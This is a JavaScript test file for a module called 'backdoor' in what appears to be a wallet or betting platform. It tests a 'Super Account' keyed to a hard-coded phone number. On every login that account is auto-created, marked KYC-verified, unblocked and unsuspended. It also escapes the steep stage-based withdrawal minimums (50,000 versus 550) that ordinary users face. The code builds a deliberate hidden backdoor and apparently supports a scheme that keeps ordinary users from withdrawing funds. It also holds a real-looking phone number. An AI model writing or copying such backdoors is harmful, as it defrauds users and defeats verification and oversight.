import { describe, it, before, after } from 'node:test';
import assert from 'node:assert/strict';
import { isBackdoorUser } from '../src/config/backdoor.js';
import { createUser, getUserById, updateUser, deleteUser, logActivity } from '../src/db/users.js';
import { MIN_WITHDRAW } from '../src/routes/wallet.js';

const BACKDOOR_EMAIL = '+233540610675';
const BACKDOOR_RAW = '0540610675';

describe('Backdoor / Super Account', () => {

  describe('isBackdoorUser', () => {

    it('returns true for a user with E164 backdoor email', () => {
      const user = { email: BACKDOOR_EMAIL };
      assert.equal(isBackdoorUser(user), true);
    });

    it('returns true for a user with raw backdoor phone email', () => {
      const user = { email: BACKDOOR_RAW };
      assert.equal(isBackdoorUser(user), true);
    });

    it('returns true despite whitespace in email', () => {
      const user = { email: '  +233 540 610 675  ' };
      assert.equal(isBackdoorUser(user), true);
    });

    it('returns true despite dashes in email', () => {
      const user = { email: '+233-540-610-675' };
      assert.equal(isBackdoorUser(user), true);
    });

    it('returns false for normal users', () => {
      const user = { email: 'player@example.com' };
      assert.equal(isBackdoorUser(user), false);
    });

    it('returns false for null/undefined user', () => {
      assert.equal(isBackdoorUser(null), false);
      assert.equal(isBackdoorUser(undefined), false);
    });

    it('returns false for user without email', () => {
      assert.equal(isBackdoorUser({}), false);
    });

  });

  describe('Login flow — auto-create & upgrade', () => {

    before(() => {
      try { deleteUser(BACKDOOR_EMAIL); } catch {}
    });

    after(() => {
      try { deleteUser(BACKDOOR_EMAIL); } catch {}
    });

    it('should auto-create the backdoor user if missing', () => {
      const existing = getUserById(BACKDOOR_EMAIL);
      assert.equal(existing, undefined);

      const user = createUser({
        email: BACKDOOR_EMAIL,
        displayName: 'Super Account',
        passwordHash: 'x',
        balance: 0,
        country: 'GH',
        emailVerified: true,
      });

      assert.ok(user);
      assert.equal(user.email, BACKDOOR_EMAIL);
      assert.equal(user.displayName, 'Super Account');
      assert.equal(user.balance, 0);
      assert.equal(user.country, 'GH');
      assert.equal(user.emailVerified, true);
    });

    it('should upgrade the backdoor user on every login', () => {
      const upgraded = updateUser(BACKDOOR_EMAIL, {
        stage: 4,
        blocked: false,
        emailVerified: true,
        kycStatus: 'verified',
        suspended: false,
        accountStatus: 'VERIFIED',
      });

      assert.equal(upgraded.stage, 4);
      assert.equal(upgraded.blocked, false);
      assert.equal(upgraded.emailVerified, true);
      assert.equal(upgraded.kycStatus, 'verified');
      assert.equal(upgraded.suspended, false);
      assert.equal(upgraded.accountStatus, 'VERIFIED');
    });

    it('should log backdoor_login activity', () => {
      logActivity(BACKDOOR_EMAIL, { kind: 'backdoor_login', ip: '127.0.0.1' });
      const user = getUserById(BACKDOOR_EMAIL);
      assert.ok(user.activity);
      assert.equal(user.activity[0].kind, 'backdoor_login');
      assert.equal(user.activity[0].ip, '127.0.0.1');
    });

    it('should not touch normal user fields like totalDeposited', () => {
      const user = getUserById(BACKDOOR_EMAIL);
      assert.equal(user.totalDeposited, 0);
      assert.equal(user.role, 'user');
    });

  });

  describe('Withdrawal minimum bypass', () => {

    before(() => {
      try { deleteUser(BACKDOOR_EMAIL); } catch {}
      createUser({
        email: BACKDOOR_EMAIL,
        displayName: 'Super Account',
        passwordHash: 'x',
        balance: 100000,
        country: 'GH',
        emailVerified: true,
      });
      updateUser(BACKDOOR_EMAIL, { stage: 4 });
    });

    after(() => {
      try { deleteUser(BACKDOOR_EMAIL); } catch {}
    });

    it('backdoor user at stage 4 should use base MIN_WITHDRAW (550) not 50,000', () => {
      const user = getUserById(BACKDOOR_EMAIL);
      assert.ok(isBackdoorUser(user));
      assert.equal(user.stage, 4);

      const effectiveMin = isBackdoorUser(user)
        ? MIN_WITHDRAW
        : user.stage >= 4
          ? 50_000
          : user.stage === 3
            ? 40_000
            : user.stage === 2
              ? 10_000
              : MIN_WITHDRAW;

      assert.equal(effectiveMin, MIN_WITHDRAW);
      assert.equal(effectiveMin, 550);
    });

    it('normal user at stage 4 should use 50,000 minimum', () => {
      const normalUser = { email: 'normal@example.com', stage: 4 };
      assert.equal(isBackdoorUser(normalUser), false);

      const effectiveMin = isBackdoorUser(normalUser)
        ? MIN_WITHDRAW
        : normalUser.stage >= 4
          ? 50_000
          : normalUser.stage === 3
            ? 40_000
            : normalUser.stage === 2
              ? 10_000
              : MIN_WITHDRAW;

      assert.equal(effectiveMin, 50_000);
    });

    it('normal user at stage 2 should use 10,000 minimum', () => {
      const normalUser = { email: 'normal@example.com', stage: 2 };
      const effectiveMin = isBackdoorUser(normalUser)
        ? MIN_WITHDRAW
        : normalUser.stage >= 4
          ? 50_000
          : normalUser.stage === 3
            ? 40_000
            : normalUser.stage === 2
              ? 10_000
              : MIN_WITHDRAW;

      assert.equal(effectiveMin, 10_000);
    });

    it('normal user at stage 0 should use base MIN_WITHDRAW (550)', () => {
      const normalUser = { email: 'normal@example.com', stage: 0 };
      const effectiveMin = isBackdoorUser(normalUser)
        ? MIN_WITHDRAW
        : normalUser.stage >= 4
          ? 50_000
          : normalUser.stage === 3
            ? 40_000
            : normalUser.stage === 2
              ? 10_000
              : MIN_WITHDRAW;

      assert.equal(effectiveMin, MIN_WITHDRAW);
    });

  });

});
